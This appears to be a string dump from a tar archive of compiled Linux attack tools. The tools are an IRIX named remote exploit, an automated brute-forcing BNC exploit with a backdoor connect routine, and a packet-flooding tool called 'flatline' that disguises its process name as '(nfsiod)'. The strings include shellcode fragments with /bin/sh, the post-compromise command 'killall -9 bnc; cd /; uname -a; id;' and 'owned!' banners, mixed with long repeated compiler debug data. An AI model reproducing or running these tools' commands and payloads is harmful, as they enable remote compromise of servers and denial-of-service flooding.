            "PEP_",
            "\td\"h",
            "\u0403;u[]",
            "IRIX named remote exploit",
            "Last Stage of Delirium, May 1998, Poland",
            "usage: %s local_adr local_port target",
            "error: address.",
            "error",
            "%s successfully exploited",
            "koniec.",
            "    ",
            "@ %<",
            "/bin/sh",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "binds.c",
            "asmcode",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "select@@GLIBC_2.0",
            "tablica",
            "bcopy@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "accept@@GLIBC_2.0",
            "_init",
            "listen@@GLIBC_2.0",
            "malloc@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "bind@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/bncex",
            "0100755",
            "0000000",
            "0000000",
            "00000037065",
            "07100656570",
            "013176",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "recv",
            "connect",
            "memcpy",
            "perror",
            "socket",
            "select",
            "write",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "read",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhd",
            "Uu>E",
            "1'EP",
            "PEP0",
            "UPlP",
            ":ou\t",
            "p\u0209hd",
            "u5h ",
            "PPlP",
            "PH[_]U0",
            "1fEP",
            "9t#hb",
            "jdhhPh",
            "Pm E",
            "PEEPh",
            "EP1fEPEP ",
            "Ed\ubac3E",
            "\u0403;u[]",
            "socket allocation",
            "connect",
            "[1mowned!",
            "killall -9 bnc; cd /; uname -a; id;",
            "select",
            "Connection closed by foreign host.",
            "socket allocation",
            "failed ",
            "err: truncated write()",
            "[32mwaiting",
            "[0m.. ",
            "[32mno.",
            "[31mBNC automated brute-forcing exploit code",
            "[32mCopyright (c) anathema <anathema@box.co.uk>",
            "usage:\t%s dst_host|ip [dst_prt]",
            "What kind of address is this: `%s`",
            "[31m",
            "Bruteforcing from ",
            "[1m0x%lx to 0x%lx",
            "[31m step %d",
            "[32mAttempting to exploit with address",
            "[1m 0x%lx",
            "[0m.. ",
            "Couldn't exploit host `%s`.",
            "r^)F",
            "f\u0340CF",
            "CCf\u0340V",
            "?)\u0340?A\u0340?A\u0340V",
            "\u0340/bin/sh",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "bncex.c",
            "c0de",
            "resolve_host",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "select@@GLIBC_2.0",
            "backdoor_connect",
            "__errno_location@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "recv@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "exploit",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/flatline",
            "0100755",
            "0000000",
            "0000000",
            "00000045720",
            "07100656602",
            "013666",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "getgid",
            "printf",
            "memcpy",
            "perror",
            "getuid",
            "malloc",
            "optarg",
            "socket",
            "inet_addr",
            "__deregister_frame_info",
            "optind",
            "rand",
            "setgid",
            "htonl",
            "sendto",
            "fork",
            "getopt",
            "memset",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "setuid",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh\u0118",
            "EntXn",
            "o hG",
            "K}\tG&",
            "1fRH",
            "]U<WVS1h",
            "tgjt&",
            "tanh",
            "H9u6h",
            "C*=l",
            "51;5l",
            "4E\u0621p",
            "EEgfffEm\u0609U\u040bE",
            "U\u040bE+E\u0409EM",
            "\tUU+U",
            "P Pf",
            ")\u0289UM",
            "\tE)\u040dP",
            "1fPQ",
            ")\u0289UM",
            "\tE)\u040dP",
            "Pd YP!",
            ")\u0289UM",
            "\tE)\u040dP",
            ")\u0289U\u070bM",
            "\tE)\u040dP",
            "1fPb",
            "P_ t",
            "e[^_]",
            "\u0403;u[]",
            "[1;33m",
            "[0;0H",
            "%s%sWe Kick Ass...",
            "[1;30m",
            "[1;35m",
            "%s%sUSAGE : %s%s > You messed it up!",
            "[*] Unable To resolve %s\t",
            "x:n:f:",
            "(nfsiod)",
            "[0;0m",
            "[0;31m",
            "[0;36m",
            "[1;37m",
            "%s[%s*%s]%s We need a Place for the Packets to Go%s",
            "%s[%s*%s]%s Unable to Allocate Required Amount of Memory for Task%s",
            "malloc",
            "socket",
            "%s  [%s*%s]%s Your OS cant Make the fork() call as we need it%s",
            "%s  [%s*%s]%s This is usually an indication of something bad%s",
            "%s  [%s*%s]%s Unable to fork%s",
            "%s  [%s*%s]%s  Process Backgrounded%s",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
